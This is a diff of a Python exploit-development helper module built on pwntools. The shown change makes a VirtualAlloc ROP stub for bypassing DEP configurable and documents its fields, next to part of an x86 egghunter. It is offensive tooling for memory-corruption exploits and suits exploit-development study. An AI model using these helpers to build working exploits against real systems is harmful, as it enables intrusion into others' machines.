@@ -218,17 +218,25 @@ def egghunter_x86_syscall(syscall, egg=b"w00t"):
       jmp edi; """       
   return pwn.asm(x86asm)
 
-def rop_stub_VirtualAlloc():
+def rop_stub_VirtualAlloc(va_addr=0x60606060,rtrn_addr=0x61616161,lpAddress=0x62626262,dwSize=0x63636363,flAllocationType=0x64646464,flProtect=0x65656565):
   """
   Return the VirtualAlloc API stub for DEP bypass using ROP.
+
+  Attributes:
+  va_addr: VirtualAllocation address 
+  rtrn_addr: return address - start address of shellcode
+  lpAddress: start address of shellcode
+  dwSize: a value from 0x01-0x999 
+  flAllocationType: 0x1000 to commit the change 
+  flProtect: 0x40 for read,write,execute
   """
   stub = (  
-    pwn.p32(0x60606060) +  # VirtualAllocation address  
-    pwn.p32(0x61616161) +  # return address - this will get changed to the address of our shellcode  
-    pwn.p32(0x62626262) +  # lpAddress - this will get changed to the address of our shellcode  
-    pwn.p32(0x63636363) +  # dwSize - this get changed to a value from 0x01-0x999  
-    pwn.p32(0x64646464) +  # flAllocationType - this get changed to 0x1000 to commit the change  
-    pwn.p32(0x65656565)    # flProtect - this will get changed to 0x40  
+    pwn.p32(va_addr)   +  # VirtualAllocation address  
+    pwn.p32(rtrn_addr) +  # return address - this will get changed to the address of our shellcode  
+    pwn.p32(lpAddress) +  # lpAddress - this will get changed to the address of our shellcode  
+    pwn.p32(dwSize)    +  # dwSize - this get changed to a value from 0x01-0x999  
+    pwn.p32(flAllocationType) +  # flAllocationType - this get changed to 0x1000 to commit the change  
+    pwn.p32(flProtect)    # flProtect - this will get changed to 0x40  
   )
   return stub
 
